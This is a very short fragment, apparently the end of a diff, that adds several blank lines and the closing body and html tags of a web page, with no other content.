+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
